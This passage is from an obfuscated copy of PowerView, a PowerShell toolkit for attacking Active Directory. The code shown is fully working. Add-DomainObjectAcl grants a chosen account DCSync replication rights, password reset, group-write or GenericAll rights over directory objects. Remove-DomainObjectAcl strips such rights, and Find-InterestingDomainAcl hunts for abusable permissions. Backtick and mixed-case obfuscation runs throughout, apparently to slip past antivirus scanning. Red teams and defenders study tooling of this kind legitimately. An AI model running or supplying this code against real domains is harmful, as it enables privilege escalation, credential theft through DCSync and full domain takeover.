                                ${_}.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                ${_}
                            }
                        }
                    }
                }
                catch {
                    WRIt`E-`VE`RBosE "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}


function a`DD-doMaI`NObJectA`cL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${T`Rue}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${taR`GEt`ide`NTIty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Targ`e`TD`oma`In},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${TA`R`G`ETlDaPF`iL`TeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${T`Ar`G`eTSEArcHbaSE},

        [Parameter(Mandatory = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`In`c`IpALIDenTity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PR`Inci`PAlDo`M`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sEr`V`Er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Se`AR`CHscOpE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsu`LtpaGE`sIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`R`VertI`M`El`Imit},

        [Switch]
        ${to`mBSto`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EdE`N`TIal} = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync', 'AllExtended')]
        [String]
        ${riG`h`TS} = 'All',

        [Guid]
        ${R`IghtS`gU`iD}
    )

    BEGIN {
        ${T`ArGETseARChE`R`ARg`UmEnTS} = @{
            'Properties' = 'distinguishedname'
            'Raw' = ${t`RUe}
        }
        if (${Psbo`UNdpA`Ra`metE`Rs}['TargetDomain']) { ${tArg`Et`se`ArcH`eR`ArG`U`MeNTs}['Domain'] = ${T`ARG`e`TDomA`in} }
        if (${Ps`B`Ound`PaRA`mEteRS}['TargetLDAPFilter']) { ${tA`RGeTsEar`cherar`GUMe`NtS}['LDAPFilter'] = ${TA`RGE`Tl`dApfI`LteR} }
        if (${PsB`ound`PARa`meT`e`RS}['TargetSearchBase']) { ${TarGEts`eAr`ch`Er`ARguMeNtS}['SearchBase'] = ${tarGet`SE`ARCH`B`ASe} }
        if (${pSBo`UN`DParamET`e`RS}['Server']) { ${tar`GeT`searche`RA`RG`UMe`NtS}['Server'] = ${s`ER`VER} }
        if (${pSbou`N`dPa`RA`MetE`RS}['SearchScope']) { ${T`AR`g`e`TSEAR`C`H`erARgumenTs}['SearchScope'] = ${SEa`RChsCo`pE} }
        if (${pSB`OuN`dp`Ar`AmEters}['ResultPageSize']) { ${taR`getseaR`ch`erARG`U`MenTS}['ResultPageSize'] = ${reSUL`TPa`GESizE} }
        if (${psboUNDP`Ar`Am`e`TeRs}['ServerTimeLimit']) { ${t`ARGETSearc`HeR`A`RgU`mEn`Ts}['ServerTimeLimit'] = ${S`Er`VeR`TIM`ELI`Mit} }
        if (${psb`oUndpaR`A`m`Ete`Rs}['Tombstone']) { ${TArG`etseArCHE`RaR`G`UmeN`TS}['Tombstone'] = ${t`OM`B`Stone} }
        if (${PsBoU`NdPaR`AMet`e`Rs}['Credential']) { ${T`ArGE`TSEaRc`hER`A`R`GU`Ments}['Credential'] = ${cReD`eN`Ti`AL} }

        ${pRin`C`IPaL`sea`RC`hEraR`GumeNts} = @{
            'Identity' = ${PRiNC`I`palI`dENtity}
            'Properties' = 'distinguishedname,objectsid'
        }
        if (${psB`oUndpa`R`AMeteRS}['PrincipalDomain']) { ${P`RINCIp`A`l`sEARCherArGumenTs}['Domain'] = ${p`RiNci`paLd`OMAIn} }
        if (${P`Sb`oUN`dPA`RAmETeRS}['Server']) { ${PRiNcIPA`LSEa`Rche`R`ArGum`EnTS}['Server'] = ${s`ErvEr} }
        if (${pSb`oUNdPar`Am`ETE`Rs}['SearchScope']) { ${prI`NCipAlsEa`RC`herAR`guMeNTs}['SearchScope'] = ${s`eaRcH`SCoPe} }
        if (${PSBOUn`dpara`MeT`erS}['ResultPageSize']) { ${P`R`iN`cipal`SeAR`cHEra`RguMeN`TS}['ResultPageSize'] = ${Res`Ul`Tpa`gESizE} }
        if (${p`sbouNd`Pa`R`A`meterS}['ServerTimeLimit']) { ${Pr`i`Nc`Ip`Alse`ArcheRA`Rgu`M`enTs}['ServerTimeLimit'] = ${sERvERTIM`eL`I`MiT} }
        if (${pS`BO`U`NdpaRAmETERS}['Tombstone']) { ${P`RiNciPaL`sEARC`He`RArguMentS}['Tombstone'] = ${tO`m`Bst`onE} }
        if (${PsBo`UND`PaRAMEt`ERs}['Credential']) { ${PR`IncIP`A`lSeA`RCHEr`Ar`GUMEnTs}['Credential'] = ${Cred`ENTI`AL} }
        ${pRi`NciPa`LS} = g`ET-domA`ino`B`jeCt @PrincipalSearcherArguments
        if (-not ${P`RIN`ciPaLS}) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        ${tARG`e`TsEAR`cHeRa`RG`UM`ENTs}['Identity'] = ${ta`R`ge`TiD`ENTItY}
        ${ta`R`gETs} = GeT-dOm`Ai`NoBj`EcT @TargetSearcherArguments

        ForEach (${tAr`GEtoBje`cT} in ${TARg`eTs}) {

            ${i`NHER`iT`ANCeTY`pE} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            ${C`Ont`RoLTYPe} = [System.Security.AccessControl.AccessControlType] 'Allow'
            ${Ac`ES} = @()

            if (${r`I`g`HTsGUID}) {
                ${G`Uids} = @(${r`I`GhT`SguID})
            }
            else {
                ${gU`IDs} = Switch (${R`ig`hTs}) {
                    
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    
                    
                    
                    
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                    'AllExtended' { 'ExtendedRight' }
                }
            }

            ForEach (${PrI`NC`I`pA`LoBJeCT} in ${prin`CIPA`LS}) {
                wrI`T`E-`VeRboSe "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"

                try {
                    ${ID`ENTiTy} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${p`RI`NCIpALO`BJ`EcT}.objectsid)

                    if (${Gu`IdS} -and !(${g`Uids} -eq 'ExtendedRight')) {
                        ForEach (${gu`id} in ${G`Uids}) {
                            ${NEW`GU`iD} = nEw-`O`B`jEcT g`Uid ${g`Uid}
                            ${AD`RI`GHTS} = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            ${Ac`eS} += ne`W-o`BjeCT Sys`TeM.Dir`EC`TOrYSeR`Vi`CES.`ActIv`edIR`ECto`RyAC`CeSSrULe ${i`D`EntItY}, ${A`d`RigHTs}, ${CO`NT`RoLtYPe}, ${NEW`Gu`ID}, ${INH`ErITan`Cet`y`pe}
                        }
                    }
                    elseif (${gU`IDs} -eq 'ExtendedRight') {
                        ${A`Dri`GH`Ts} = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                        ${A`ceS} += n`EW`-objECT SYS`TEm.DIREcTorYSe`RviCes`.ACt`iVedIR`eCtOrYa`Cc`ESs`R`U`Le ${iDENt`i`TY}, ${a`dri`GhTS}, ${C`ont`RoltYpE}, ${inH`E`R`ItanC`ETyPE}
                    }
                    else {
                        
                        ${a`DR`ighTs} = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        ${ac`es} += N`Ew-`OBJeCt S`y`Ste`m.DirEcTO`RY`S`eRv`iCE`S.`AC`TiVEDIREcTorYAcCeS`sruLE ${i`den`TItY}, ${adR`I`GhTS}, ${C`oNTrOlT`ype}, ${iNhe`RitAN`ce`T`yPe}
                    }

                    
                    ForEach (${A`Ce} in ${A`Ces}) {
                        Wri`TE-VERBo`SE "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        ${T`Ar`geTenT`Ry} = ${tarGe`To`BjecT}.GetDirectoryEntry()
                        ${Tar`G`eTEN`Try}.PsBase.Options.SecurityMasks = 'Dacl'
                        ${TAR`get`ENTRy}.PsBase.ObjectSecurity.AddAccessRule(${a`cE})
                        ${T`ArgET`eN`TRY}.PsBase.CommitChanges()
                    }
                }
                catch {
                    WRi`T`E-verb`OSE "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function reM`ove-doM`A`iN`obJeCt`A`cl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${t`RuE}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${Ta`RgET`IdE`NTI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${t`A`R`G`etdOMAin},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${T`ARGEtLd`A`PfI`LT`eR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TaRgE`TSe`A`RChBa`sE},

        [Parameter(Mandatory = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`INC`iPA`L`IDE`NTiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PR`inC`iPal`DOm`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`R`VER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${se`A`RCHS`cope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`U`L`TpAGe`sIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERvERTimel`i`mit},

        [Switch]
        ${tom`B`STOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREdE`NTI`AL} = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        ${r`IG`HtS} = 'All',

        [Guid]
        ${R`I`ghTs`GUid}
    )

    BEGIN {
        ${taRgETseARCH`ERArG`Um`En`Ts} = @{
            'Properties' = 'distinguishedname'
            'Raw' = ${T`RUE}
        }
        if (${PsBo`Un`DPARa`Me`TerS}['TargetDomain']) { ${TarGeT`S`eArc`hERaRgume`Nts}['Domain'] = ${TarGE`T`d`omain} }
        if (${PSbOUNDP`Ar`AM`eTers}['TargetLDAPFilter']) { ${TArg`ETs`eaR`c`HERarg`U`meNTs}['LDAPFilter'] = ${T`ArgetLDAp`F`I`Lter} }
        if (${PSBOUN`dP`ArAmE`T`eRs}['TargetSearchBase']) { ${tArg`eTS`eA`RCHeRaR`GuMENtS}['SearchBase'] = ${tARg`etsE`ArC`hBa`sE} }
        if (${PSbo`UndpA`RaMEt`eRs}['Server']) { ${targE`Ts`E`ArcHeRARGuMeN`Ts}['Server'] = ${SE`R`VER} }
        if (${PS`BOUNDpaR`AMet`eRS}['SearchScope']) { ${TAr`G`e`T`SEARCheR`ARg`UMENts}['SearchScope'] = ${s`EarC`hs`coPE} }
        if (${p`sB`oUndPa`RA`Me`Ters}['ResultPageSize']) { ${TARG`etSeA`RchE`RA`R`gUmE`Nts}['ResultPageSize'] = ${REs`UlTPa`GE`siZe} }
        if (${p`sbo`UnDPar`AmETErS}['ServerTimeLimit']) { ${tAR`G`EtSe`A`RcHERa`Rg`UM`ENtS}['ServerTimeLimit'] = ${SErvE`R`TiMel`i`mIt} }
        if (${ps`Bo`UnDPaRam`ete`Rs}['Tombstone']) { ${TaR`GeT`S`Ea`Rc`HERar`gUmEnts}['Tombstone'] = ${tOMBSt`O`Ne} }
        if (${psbOUNdPa`R`AM`eTers}['Credential']) { ${ta`RgeTsEAR`CHE`Rar`gUmENtS}['Credential'] = ${cReDe`N`TiAL} }

        ${prINCIPaLSe`AR`CHEr`AR`GU`m`EntS} = @{
            'Identity' = ${Pri`NC`iPa`LidE`Nt`ity}
            'Properties' = 'distinguishedname,objectsid'
        }
        if (${PSbOuN`Dp`ArA`mEtERs}['PrincipalDomain']) { ${pr`inCiPAlsEaRCHERargu`m`En`Ts}['Domain'] = ${Pr`IncI`paL`doMain} }
        if (${p`sB`OuN`DparamEt`E`RS}['Server']) { ${P`R`iNciPaLSeArCHerAR`gu`MEnTs}['Server'] = ${Se`R`Ver} }
        if (${PS`BOUNDP`A`RAMeTERS}['SearchScope']) { ${PRi`Ncip`ALsEAR`ChEr`ARgUm`enTS}['SearchScope'] = ${SeA`R`cHs`COpE} }
        if (${p`SB`O`UnDpA`R`AMEtErs}['ResultPageSize']) { ${PRinCiPAL`Se`ARc`hE`R`Ar`gumEn`TS}['ResultPageSize'] = ${RES`U`lt`pAgesI`ze} }
        if (${P`SB`oUNd`PAra`meTe`RS}['ServerTimeLimit']) { ${pRInCi`pA`LSear`cher`Ar`G`U`mEn`TS}['ServerTimeLimit'] = ${s`erVerT`iMeliM`iT} }
        if (${p`sbOUndP`ARa`mE`TERs}['Tombstone']) { ${pRin`C`IpAls`eARcH`ERaRguME`Nts}['Tombstone'] = ${t`oM`BsTO`NE} }
        if (${pS`Bo`UN`d`Par`AmeTErs}['Credential']) { ${PrI`N`ciP`AL`sE`A`RcheRarGUmE`Nts}['Credential'] = ${C`RE`denTi`AL} }
        ${P`Ri`NciPaLS} = g`eT-domain`OB`j`e`CT @PrincipalSearcherArguments
        if (-not ${pri`Nc`Ipals}) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        ${ta`Rge`Ts`e`Arc`HeRa`RgUMEnTs}['Identity'] = ${TArGE`T`IdEn`TItY}
        ${Ta`RGEts} = GEt-`DoMA`inoBj`E`cT @TargetSearcherArguments

        ForEach (${Ta`RGETobj`ecT} in ${taRG`etS}) {

            ${iNHErItA`Nc`ETY`pe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            ${coNT`RO`lty`Pe} = [System.Security.AccessControl.AccessControlType] 'Allow'
            ${a`ces} = @()

            if (${ri`gHTSg`UId}) {
                ${gui`ds} = @(${Ri`g`hTSGU`iD})
            }
            else {
                ${G`U`IdS} = Switch (${R`IGH`TS}) {
                    
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    
                    
                    
                    
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach (${PR`inC`ipaLOB`jE`CT} in ${p`RIN`CipaLs}) {
                wR`ITe-Ver`Bo`sE "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"

                try {
                    ${Ide`N`TiTy} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${p`RinCIp`Al`ob`J`ecT}.objectsid)

                    if (${Gu`ids}) {
                        ForEach (${GU`Id} in ${Gu`i`DS}) {
                            ${NEW`G`Uid} = neW-o`Bj`EcT g`UId ${g`UId}
                            ${aDriG`h`TS} = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            ${a`CEs} += N`EW-O`BJeCT Sy`stEm.DIREcTO`R`YseR`ViCEs`.A`cT`I`VEDi`R`eCTORyaCCESS`RULE ${iD`ent`Ity}, ${Adr`igh`TS}, ${C`oNtr`ol`TyPe}, ${Ne`WGUID}, ${iNHE`R`iTAN`CE`Type}
                        }
                    }
                    else {
                        
                        ${adr`I`GHTS} = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        ${a`cEs} += NEW-O`B`J`ECt syStem.DirE`cto`RyS`e`RViCES`.aC`Ti`V`EdiRECToRyaC`Ce`ssruLe ${IDEN`Tity}, ${A`dRi`GH`TS}, ${COnTRo`ltY`PE}, ${i`N`heriTa`NCeT`yPe}
                    }

                    
                    ForEach (${a`Ce} in ${AC`es}) {
                        wri`Te-ver`B`oSE "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        ${tarGe`T`ent`Ry} = ${TA`RGETOb`je`cT}.GetDirectoryEntry()
                        ${Targ`et`Entry}.PsBase.Options.SecurityMasks = 'Dacl'
                        ${TA`RGEten`T`Ry}.PsBase.ObjectSecurity.RemoveAccessRule(${a`Ce})
                        ${ta`Rg`E`TEnTRY}.PsBase.CommitChanges()
                    }
                }
                catch {
                    wRitE-vE`R`BOse "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function fInD-`InteResti`N`gDOM`Ai`Nacl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${t`RUE})]
        [Alias('DomainName', 'Name')]
        [String]
        ${D`OMAin},

        [Switch]
        ${rESoL`VE`GUI`DS},

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        ${RiGHT`S`FiLtEr},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LdaP`F`ILt`Er},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEaR`C`hBase},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`eRVer},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Se`ARc`HSc`oPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`ESu`l`TpAgeSI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`V`ERtIMElIM`It},

        [Switch]
        ${to`MbS`T`onE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReD`EnT`IaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${Acl`ArGUMEn`Ts} = @{}
        if (${P`s`BounDParAM`eters}['ResolveGUIDs']) { ${AcLaR`g`UmE`NtS}['ResolveGUIDs'] = ${reS`O`L`VegUIds} }
        if (${ps`B`oUndpa`RaMET`ERS}['RightsFilter']) { ${acLar`gUme`NTs}['RightsFilter'] = ${Rig`HTSF`ILTER} }
        if (${pSbou`N`DpAr`AmETers}['LDAPFilter']) { ${AClA`RGU`meN`TS}['LDAPFilter'] = ${LD`A`pFIL`Ter} }
        if (${pS`BO`UnDpAr`AmetERs}['SearchBase']) { ${AcLar`gUM`en`Ts}['SearchBase'] = ${SeArC`h`BAsE} }
        if (${ps`BO`UN`D`PaRAME`TErS}['Server']) { ${AclarG`UmEn`Ts}['Server'] = ${sE`Rv`eR} }
        if (${psbouND`p`Aram`ETeRs}['SearchScope']) { ${ACLa`RGuME`Nts}['SearchScope'] = ${sEA`Rc`Hsco`pE} }
        if (${pSBoUn`d`Pa`RaME`TE`RS}['ResultPageSize']) { ${aCLA`R`guMeNTS}['ResultPageSize'] = ${Res`UlTpAG`eS`Ize} }
        if (${p`Sb`OundPa`RAmEters}['ServerTimeLimit']) { ${aClArG`U`m`eN`Ts}['ServerTimeLimit'] = ${S`E`Rvert`Imel`imIT} }
        if (${p`sboUndParamET`E`Rs}['Tombstone']) { ${a`c`LA`RguMEnTs}['Tombstone'] = ${T`omBSt`oNE} }
        if (${pSb`OU`N`DpaRaM`eTERs}['Credential']) { ${AClAr`gUmen`Ts}['Credential'] = ${C`ReD`eNT`IAl} }

        ${O`BjECTSearcH`era`R`gUm`eN`Ts} = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = ${T`RUE}
        }
        if (${P`sB`OU`ND`PaRameTe`Rs}['Server']) { ${oBJEC`TsEarChE`R`A`Rgu`meN`Ts}['Server'] = ${Se`RVER} }
        if (${p`S`B`OuNd`P`ArAMetERS}['SearchScope']) { ${obJE`CTsEARCHera`R`GuM`ents}['SearchScope'] = ${S`e`ARcHs`cope} }
        if (${pS`Bo`UNdpAr`AmetERs}['ResultPageSize']) { ${OBJ`ectseA`RCh`er`Ar`guMEnTs}['ResultPageSize'] = ${resUL`TpA`geSI`Ze} }
        if (${pSb`Ound`pARameT`ers}['ServerTimeLimit']) { ${O`BjEc`T`sEarCHeRaRgum`E`N`TS}['ServerTimeLimit'] = ${s`erVe`RtIM`ElImiT} }
        if (${p`S`B`o`UNdparAMEteRs}['Tombstone']) { ${o`BjeCTseArcHERaR`G`Ume`NtS}['Tombstone'] = ${t`ombsT`onE} }
        if (${P`SBo`U`NdPA`RAmE`TERS}['Credential']) { ${o`B`Je`Cts`E`ArchErARgUM`ENts}['Credential'] = ${cRE`d`eNTI`Al} }

        ${aDN`Am`EArG`UMeNTs} = @{}
        if (${psBO`U`NdpArAmE`TeRs}['Server']) { ${adN`A`m`ea`Rgu`meNTS}['Server'] = ${ser`VeR} }
        if (${p`sB`O`UND`P`ARAmEtERS}['Credential']) { ${ADnamEArG`U`M`enTs}['Credential'] = ${crE`DENTI`Al} }

        
        ${resOl`Ved`Si`dS} = @{}
    }

    PROCESS {
        if (${P`S`BOUN`dParAM`eTe`RS}['Domain']) {
            ${ACLA`Rg`U`M`entS}['Domain'] = ${D`Om`AiN}
            ${Ad`N`AMEARguM`E`NTs}['Domain'] = ${D`omA`in}
        }

        G`et-DoMAINoBJ`ec`Tacl @ACLArguments | For`eacH-`obJ`eCT {

            if ( (${_}.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or ((${_}.ActiveDirectoryRights -match 'ExtendedRight') -and (${_}.AceQualifier -match 'Allow'))) {
                
                if (${_}.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if (${rE`SolVEDsi`dS}[${_}.SecurityIdentifier.Value]) {
                        ${i`De`N`TiTy`Re`FE`RencENaMe}, ${IdEntIt`yRE`F`eRencEd`O`M`AIn}, ${IdeNT`I`TYReFereN`CE`Dn}, ${i`DenTI`T`YREFE`R`ENCeclAsS} = ${REs`Ol`V`eDsiDs}[${_}.SecurityIdentifier.Value]

                        ${I`NTEr`estiN`ga`CL} = new`-OBje`CT pSo`B`jEct
                        ${intEr`E`sTinG`ACL} | A`dd-Memb`ER n`oT`EPro`PERTy 'ObjectDN' ${_}.ObjectDN
                        ${In`T`EreS`T`INgaCL} | add-`me`mbEr n`ot`EPr`OPErTy 'AceQualifier' ${_}.AceQualifier
                        ${I`NtE`RE`stingaCl} | aDD`-`Me`mBeR noT`EpR`OP`Erty 'ActiveDirectoryRights' ${_}.ActiveDirectoryRights
                        if (${_}.ObjectAceType) {
                            ${I`NTeres`TiNG`AcL} | a`dD`-m`eMBEr NoT`ePr`opErty 'ObjectAceType' ${_}.ObjectAceType
                        }
                        else {
                            ${intERE`sT`i`NGACl} | add-Mem`B`Er NOT`ePrOP`ERtY 'ObjectAceType' 'None'
                        }
                        ${iNtE`REsti`Nga`cL} | ADD-m`Em`Ber NoT`E`PrO`pERty 'AceFlags' ${_}.AceFlags
                        ${InT`ER`ESTiNg`Acl} | Add-`M`EMbeR NOT`e`pro`PerTY 'AceType' ${_}.AceType
                        ${iNT`E`ResT`INgAcl} | Ad`D-`MeMBer NO`T`EPROpE`RTY 'InheritanceFlags' ${_}.InheritanceFlags
                        ${I`NtE`RE`StinGa`cl} | a`DD`-membER noT`EProp`ertY 'SecurityIdentifier' ${_}.SecurityIdentifier
                        ${IN`T`eRest`i`NGacL} | aDD-me`m`BEr NO`TEProPer`TY 'IdentityReferenceName' ${iD`Ent`it`yrEf`er`enCeN`AMe}
                        ${intEr`ESTi`N`g`Acl} | ADd-`mE`Mber no`TepRO`p`ERty 'IdentityReferenceDomain' ${iDENtIt`yr`EFeRenCed`o`m`A`iN}
                        ${iNt`eresti`Ng`AcL} | add-`mE`mbeR nOt`ePR`Oper`Ty 'IdentityReferenceDN' ${idEnT`ITYR`Ef`ERe`NC`EDN}
                        ${InTERES`TIn`G`AcL} | A`dd-`MembEr NO`TEpR`Op`ERTy 'IdentityReferenceClass' ${i`dEnTI`TY`ReFE`Ren`cECLaSs}
                        ${iNtE`ReSTIN`g`AcL}
                    }
                    else {
                        ${idENTIT`y`Refer`encEDn} = CO`NVe`Rt-AdNaME -Identity ${_}.SecurityIdentifier.Value -OutputType d`N @ADNameArguments
                        

                        if (${i`d`enti`TyrefErenCEdn}) {
                            ${id`eNtiTyRef`Ere`NCeD`Om`A`iN} = ${iD`entItyref`er`EnCe`dN}.SubString(${ID`ENtiTy`Re`Ferenc`EDN}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            ${OBJ`ectSE`ArCHerarGu`M`en`TS}['Domain'] = ${iDEN`TI`Tyr`eFe`REnCe`dOmA`In}
                            ${OB`jECt`s`eA`RCheraRGUMen`TS}['Identity'] = ${iDe`N`TItyre`FErE`NCE`DN}
                            
                            ${Obj`ect} = GET-`do`m`AiNoBjEcT @ObjectSearcherArguments

                            if (${o`B`jECt}) {
                                ${iD`eN`Ti`TY`REFErE`Nc`Ename} = ${OB`JeCt}.Properties.samaccountname[0]
                                if (${oBjE`CT}.Properties.objectclass -match 'computer') {
                                    ${idenT`It`Y`ReFe`REnc`eCL`A`sS} = 'computer'
                                }
                                elseif (${oB`JE`cT}.Properties.objectclass -match 'group') {
                                    ${IdEn`TI`Ty`Re`FE`REnCEc`lass} = 'group'
                                }
                                elseif (${ob`je`cT}.Properties.objectclass -match 'user') {
                                    ${iDen`Tit`yREF`e`REn`CEClasS} = 'user'
                                }
                                else {
                                    ${IdE`N`TItYRe`FeRE`Ncec`lAsS} = ${nU`Ll}
                                }

                                
                                ${rESOlvED`Si`Ds}[${_}.SecurityIdentifier.Value] = ${i`D`EnTi`T`YrEfeREncEN`A`Me}, ${idEn`T`ity`REFE`RE`Nc`EdOm`AiN}, ${I`DeNtitYr`EFe`REnc`Edn}, ${ID`EnTiTyRefe`RE`NcEc`l`ASS}

                                ${InTERE`st`I`NgAcl} = NE`W-oB`jE`CT pSo`B`JEcT
                                ${I`NTEReS`Ti`NGAcl} | A`dd-mE`MBer noT`e`PRo`PerTy 'ObjectDN' ${_}.ObjectDN
                                ${iNTEr`EsTI`NGACL} | a`Dd`-MEMBEr notePrOp`eR`TY 'AceQualifier' ${_}.AceQualifier
                                ${i`NTe`RestinG`A`Cl} | aD`d`-mEmber NOTE`pr`OpEr`TY 'ActiveDirectoryRights' ${_}.ActiveDirectoryRights
                                if (${_}.ObjectAceType) {
                                    ${INT`E`R`eSTiNGaCl} | AdD-m`Emb`eR N`OTePro`pErTy 'ObjectAceType' ${_}.ObjectAceType
                                }
                                else {
                                    ${Inte`R`EST`IN`GaCL} | AdD-`ME`MBer n`OTEPR`OPErtY 'ObjectAceType' 'None'
                                }
                                ${InT`eR`EsTING`A`cl} | aDD-`M`Emb`Er N`OTEP`R`OPerty 'AceFlags' ${_}.AceFlags
                                ${IN`TER`eST`I`NGacL} | adD`-ME`MBER nOtepROP`e`R`TY 'AceType' ${_}.AceType
                                ${INTeRe`StI`NG`AcL} | adD-m`Em`Ber notEpR`O`pE`RTy 'InheritanceFlags' ${_}.InheritanceFlags
                                ${I`N`TerE`St`IngAcL} | A`dd-memB`Er Not`Epr`OpeRTY 'SecurityIdentifier' ${_}.SecurityIdentifier
                                ${In`T`eREstI`NgA`Cl} | ADD-m`emB`ER notE`p`RoPErTY 'IdentityReferenceName' ${iD`e`NtI`TyR`EFEreNcENAmE}
                                ${i`NtERestiNg`ACl} | aDD-m`eMb`Er no`TE`PrOPeRtY 'IdentityReferenceDomain' ${IdE`N`TitY`REFERence`D`OMAIn}
                                ${INTER`E`sTINGa`cL} | aD`D-MEM`BER notEP`R`Oper`Ty 'IdentityReferenceDN' ${IdE`NtitYreFe`REN`cEdN}
                                ${iN`Te`RESTI`NGaCL} | a`DD-MeM`BER n`ote`p`RoPerTY 'IdentityReferenceClass' ${ideNTI`TY`Refer`encECLA`Ss}
                                ${I`NT`eRES`TI`NgaCl}
                            }
                        }
                        else {
                            Wr`ITE-WArN`iNG "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}


function G`e`T-Dom`AINOU {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('Name')]
        [String[]]
        ${Id`eN`TITY},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${G`PL`INK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OM`AIn},

